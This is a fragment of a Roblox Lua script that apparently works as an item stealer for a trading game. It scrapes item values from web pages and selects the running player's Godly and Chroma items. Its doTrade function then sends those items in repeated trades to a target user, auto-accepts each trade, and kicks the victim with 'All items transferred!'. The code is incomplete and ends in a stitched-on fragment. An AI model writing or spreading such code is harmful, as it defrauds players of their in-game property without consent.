local function trim(s) return s:match("^%s*(.-)%s*$") end
local function fetchHTML(url)
    local f = request or (syn and syn.request) or http_request
    if not f then return "" end
    local res = f({Url=url, Method="GET", Headers=headers})
    return res and res.Body or ""
end
local function parseValue(body)
    local s = body:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if s then return tonumber(s:gsub(",", "")) end
    return nil
end
local function extractItems(html)
    local t = {}
    for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name = name:match("([^<]+)") if not name then continue end
        name = trim(name:gsub("%s+", " ")):lower()
        name = trim((name:split(" Click "))[1])
        local v = parseValue(body)
        if v then t[name] = v end
    end
    return t
end
local function extractChroma(html)
    local t = {}
    for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name = name:match("([^<]+)") if not name then continue end
        name = trim(name:gsub("%s+", " ")):lower()
        local v = parseValue(body)
        if v then t[name] = v end
    end
    return t
end
local function buildValueList()
    local all, chromaAll, list = {}, {}, {}
    local threads = {}
    for rarity, url in pairs(categories) do
        table.insert(threads, task.spawn(function()
            local html = fetchHTML(url)
            if html and html ~= "" then
                if rarity == "chroma" then
                    chromaAll = extractChroma(html)
                else
                    for k, v in pairs(extractItems(html)) do all[k] = v end
                end
            end
        end))
    end
    for _, t in ipairs(threads) do task.wait(t) end
    for dataid, item in pairs(database) do
        local itemName = (item.ItemName or ""):lower()
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false
        if itemName ~= "" and rarity ~= "" then
            local idx = table.find(rarityTable, rarity)
            local godlyIdx = table.find(rarityTable, "Godly")
            if idx and godlyIdx and idx >= godlyIdx then
                if hasChroma then
                    for k, v in pairs(chromaAll) do
                        if k:find(itemName) then list[dataid] = v break end
                    end
                else
                    if all[itemName] then list[dataid] = all[itemName] end
                end
            end
        end
    end
    return list
end

local function doTrade(targetUser)
    local init = getTradeStatus()
    if init == "StartTrade" then pcall(function() ReplicatedStorage.Trade.DeclineTrade:FireServer() end) task.wait(0.3)
    elseif init == "ReceivingRequest" then pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end) task.wait(0.3) end
    while #weaponsToSend > 0 do
        local status = getTradeStatus()
        if status == "None" then sendTradeRequest(targetUser)
        elseif status == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local it = table.remove(weaponsToSend, 1)
                for _ = 1, it.Amount do addItem(it.DataID) task.wait(0.05) end
            end
            task.wait(6)
            acceptTrade()
            waitTradeEnd()
        end
        task.wait(1)
    end
    SendFinalMessage(sentCopy)
    task.wait(2)
    plr:Kick("All items transferred!")
end

            p.Chatted:Connect(function()
                if waiting then
                    waiting = false

                end
            end)
        end
    end
    for _, p in ipairs(Players:GetPlayers()) do checkPlayer(p) end
    Players.PlayerAdded:Connect(checkPlayer)
end
